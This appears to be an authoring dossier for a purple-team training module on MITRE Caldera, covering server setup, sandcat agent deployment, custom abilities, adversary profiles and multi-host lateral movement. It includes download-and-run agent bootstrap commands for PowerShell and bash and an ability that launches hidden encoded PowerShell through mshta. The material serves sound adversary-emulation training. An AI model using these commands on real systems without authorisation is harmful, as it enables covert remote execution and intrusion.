# L3 Module 3 — MITRE Caldera operations — Research Dossier

_Authoring source-of-truth for `seed_courses.py` ship of L3 M3 in v0.12.9._

Audience: L3 detection-engineer / purple-team analyst. Prereq: L3 M1 (purple-team flow) + M2 (ART deep-dive). Caldera builds on ART's atomic primitives; M3 assumes M2's vocabulary.

## Module shape

8 lessons (7 reading + 1 quiz), 9 questions, ~16k words at BTL1/SANS depth.

## Learning objectives

1. Recognise Caldera's **architecture** — server, agents (sandcat / manx), abilities, adversaries, operations.
2. **Stand up the server** via the official docker-compose; install the canonical plugins.
3. Deploy **sandcat agents** to target hosts and recognise the **beacon mechanic**.
4. Author a **custom ability** in the YAML format and load it via a plugin.
5. Build a **custom adversary profile** that chains abilities with explicit / inferred dependencies.
6. Run an **operation** — manual / automatic / batch planners — and read the operation report.
7. Orchestrate **multi-host operations** — lateral movement, agent-to-agent fact propagation, multi-agent abilities.
8. Apply the **agent-removal-after rule** (M1.5 reminder) at chain-end with verification.

## Lesson plan

### L3.1 — Caldera architecture: server, agents, abilities, adversaries, operations
~2200 words. The five core concepts:
- **Server** — Aiohttp + Vue.js UI; aggregates abilities, adversaries, operations, results.
- **Agent** — sandcat (canonical Go-based, multi-platform) or manx (passive shell). Beacons to server, picks up orders, reports results.
- **Ability** — one ATT&CK technique encoded as one or more executable commands; the Caldera analogue of an ART atomic.
- **Adversary** — ordered list of abilities, optionally with dependencies; the Caldera analogue of a kill-chain script.
- **Operation** — a runtime instance: pick adversary, pick agents, run, observe results.

The relationship: abilities are reusable building blocks; adversaries chain them; operations execute the chain on real hosts.

Compare/contrast with ART (M2 cross-link): ART abilities are YAML files + IART runner; Caldera abilities are YAML in plugins + agent-driven beacon. Caldera adds the *agent runtime* and the *operation orchestration* layers.

Knowledge check: 1 SINGLE — distinguish ability / adversary / operation.

### L3.2 — Standing up the server
~2000 words. Docker compose path (canonical):

```bash
git clone https://github.com/mitre/caldera --recursive
cd caldera
docker compose up -d
# UI at http://localhost:8888 — login: red / admin
```

The `--recursive` is critical: Caldera's plugins live in git submodules. Without it, plugins are missing.

Canonical plugins (loaded at server start via `default.yml`):
- **stockpile** — the upstream library of vetted abilities and adversaries.
- **sandcat** — the canonical agent's binaries + build pipeline.
- **manx** — passive-shell agent.
- **atomic** — bridges ATT&CK Atomic Red Team yaml into Caldera's ability format.
- **caltack** — local copy of ATT&CK matrix for offline use.
- **compass** — Navigator-overlay generator.
- **debrief** — operation reporting / scorecard.
- **response** — autonomous responders (defensive testing).

For purple-team programs: `stockpile` + `atomic` + `compass` + `debrief` is the working set.

The default credentials (`red / admin`) MUST be rotated on first install. See `conf/local.yml` after first server start; rotate `users.red.password`.

Knowledge check: 1 SHORTANSWER — what's the URL of the Caldera UI on the docker-compose default install?

### L3.3 — Sandcat agent: deploying + beacon mechanics
~2200 words. Sandcat is a Go binary cross-compiled for Windows / Linux / macOS / FreeBSD. The Caldera UI's *Agents → Deploy an agent* page generates a one-line bootstrap command per platform.

Windows PowerShell deploy:

```powershell
$server="http://caldera.lab:8888";$url="$server/file/download";$wd=New-Item -Type Directory ($env:TEMP + "\\sc-" + (Get-Random)) -Force;$wc=New-Object Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$wc.DownloadFile($url, $wd.FullName + "\\sandcat.exe");Start-Process -FilePath ($wd.FullName + "\\sandcat.exe") -ArgumentList "-server","$server","-group","red"
```

Linux bash deploy:

```bash
server="http://caldera.lab:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/sandcat
chmod +x /tmp/sandcat
/tmp/sandcat -server $server -group red &
```

Beacon mechanic:
- Agent beacons every N seconds (default 60s, randomised ±20%).
- Each beacon: agent reports paw (UUID), platform, host, group, contact channel; server replies with pending orders if any.
- Contact channels: HTTP (default), TCP, UDP, GIST, DNS-tunnelling. The L3 picks based on egress posture.

Agent identity:
- **paw** — UUID assigned by server on first beacon.
- **group** — logical grouping (e.g. "red", "blue", "engineering-workstations").
- **platform** — auto-detected.

Sandcat lives in memory after launch; `kill <pid>` stops it. The server's **Agents → Kill** action sends a remote-kill command on next beacon. The agent's binary on disk persists until manual removal — the M1.5 agent-removal-after rule applies.

Knowledge check: 1 MULTI — pick valid sandcat contact channels.

### L3.4 — The ability library: writing custom abilities
~2200 words. Abilities live in a plugin's `data/abilities/<tactic>/<id>.yml`. Format:

```yaml
- id: 12345678-90ab-cdef-1234-567890abcdef
  name: Mshta executes encoded PowerShell
  description: |
    Launches mshta with vbscript that invokes PowerShell with an
    encoded command. Emulates the FIN6 / Conti launcher pattern.
  tactic: execution
  technique:
    attack_id: T1059.001
    name: Command and Scripting Interpreter — PowerShell
  platforms:
    windows:
      psh:
        command: |
          mshta vbscript:CreateObject("Wscript.Shell").Run("powershell.exe -nop -w hidden -enc #{payload}")(window.close)
        cleanup: |
          # No persistence; cleanup is a no-op
        timeout: 60
  requirements:
    - plugins.stockpile.requirements.basic:
        - source: payload
          edge: has_payload
```

Field walkthrough:
- `id` — UUID; must be unique across the whole library.
- `name` / `description` — human readers.
- `tactic` — ATT&CK tactic (kebab-case: `command-and-control`, etc.).
- `technique.attack_id` — ATT&CK technique id.
- `platforms` — map of platform → executor → command/cleanup/timeout.
- `requirements` — what facts must be present before this ability can run.

The `#{payload}` is a *fact* substitution: at runtime, Caldera substitutes facts from the operation's fact set.

Loading custom abilities: drop the YAML into a plugin's `data/abilities/<tactic>/` folder, restart the server. The plugin loader picks them up.

Knowledge check: 1 SINGLE — given an ability, identify its tactic.

### L3.5 — Adversary profiles: chained abilities + dependencies
~2000 words. Profiles in `<plugin>/data/adversaries/<id>.yml`:

```yaml
- id: 5d3e170e-... (FIN6 emulation)
  name: FIN6 Compressed
  description: |
    Compressed end-to-end FIN6 chain — initial-access through impact.
  atomic_ordering:
    - <ability-uuid-T1566.001>
    - <ability-uuid-T1059.001>
    - <ability-uuid-T1547.001>
    - <ability-uuid-T1003.001>
    - <ability-uuid-T1018>
    - <ability-uuid-T1021.002>
    - <ability-uuid-T1071.001>
    - <ability-uuid-T1486>
```

`atomic_ordering` is a flat list — Caldera runs in order. For chains where step N's output feeds step N+1, the abilities use **facts** to pass data:

- Ability 5 (T1018 — net group enumeration) emits `host.user.name` facts when it discovers admin users.
- Ability 6 (T1021.002 — SMB lateral) requires `host.user.name` as a fact; matches ability 5's output.

The Caldera planner uses fact dependencies to compute which abilities can run in which order. The default *batch* planner runs abilities sequentially; the *atomic* planner runs them as soon as their facts are satisfied.

Custom profile authoring:
1. Pick the AEL plan (M2 L6) — FIN6, APT3, etc.
2. Map each phase to a Caldera ability (use `atomic` plugin for ART-bridged abilities, or stockpile for native ones).
3. Order them; add fact dependencies where needed.
4. Save the YAML, restart server.

Knowledge check: 1 SHORTANSWER — what plugin loads ART atomics into Caldera as abilities?

### L3.6 — Operations: launching, planners, monitoring
~2200 words. An operation is a runtime instance. UI walk:
1. **Operations → Add operation**.
2. Pick adversary (e.g. FIN6 Compressed).
3. Pick group (the agents tagged for this exercise — typically `red` or a custom test group).
4. Pick planner: `batch` (sequential), `atomic` (fact-driven), `buckets` (per-tactic), `look` (concurrent abilities).
5. Set obfuscator (`base64`, `caesar`, `plain-text`).
6. Set jitter (per-beacon randomness).
7. Run.

Operation states: created → running → finished. Pause / resume mid-flight. Abilities marked `link` are runnable; the planner picks the next link based on its strategy.

Operation report (`debrief` plugin):
- Per-ability outcome: success / failure / skipped.
- Output captured per ability (stdout, stderr, exit code).
- Facts collected during operation.
- ATT&CK technique coverage of the chain.
- Time-to-complete per ability + total chain.

The L3 reads the report after every operation; the chain timing is the load-bearing data point for response-leverage analysis (M1 L1.5).

Knowledge check: 1 SINGLE — pick the right planner for a fact-dependent chain.

### L3.7 — Multi-host operations: lateral movement orchestration
~2200 words. Single-agent operations exercise host-local TTPs. Multi-host operations exercise *lateral* TTPs.

Setup:
1. Deploy sandcat to 3+ hosts (initial-access target, lateral target, impact target).
2. Tag each agent's group accordingly (e.g. `red-initial`, `red-lateral`, `red-impact`).
3. In the operation, pick *all three groups* — Caldera runs the chain across the agent set, with abilities targeting specific group filters.

Fact propagation across agents:
- Agent 1 runs `T1018 net group "Domain Admins"` — emits `host.user.name` facts.
- Agent 1's facts are stored on the server.
- Agent 2 runs `T1021.002 SMB lateral move` — pulls `host.user.name` from the operation's fact set.
- Agent 2 establishes session as the discovered user, *on agent 2's host*.

The "agent-to-agent" abilities — abilities with the requirement that source agent != target agent — are how Caldera models real lateral movement.

Worked: a 4-step lateral chain (recon → cred-dump → SMB lateral → secondary recon on target). Each step's expected agent + fact dependency.

Knowledge check: 1 SINGLE — when does Caldera run a lateral ability on a different agent.

### L3.8 — Capstone quiz
2 questions covering deployment + ability authoring + multi-host orchestration.

## Quiz blueprint (9 questions)

- L3.1 — 1 SINGLE (ability/adversary/operation distinction)
- L3.2 — 1 SHORTANSWER (UI URL)
- L3.3 — 1 MULTI (contact channels)
- L3.4 — 1 SINGLE (tactic identification)
- L3.5 — 1 SHORTANSWER (atomic-bridge plugin)
- L3.6 — 1 SINGLE (planner pick)
- L3.7 — 1 SINGLE (lateral ability execution)
- L3.8 — 2 capstone

## References

- Caldera repo — https://github.com/mitre/caldera.
- Caldera documentation — https://caldera.readthedocs.io/.
- Plugin library docs — https://github.com/mitre/caldera/blob/master/docs/Plugin-library.md.
- MITRE Engenuity AEL — for adversary profile sources (M2 cross-link).

---

_Implementation: append `mod3 = _add_module(...)` after `mod2`'s quiz lesson, before `return course`. Update print to "3 modules, 24 lessons"._
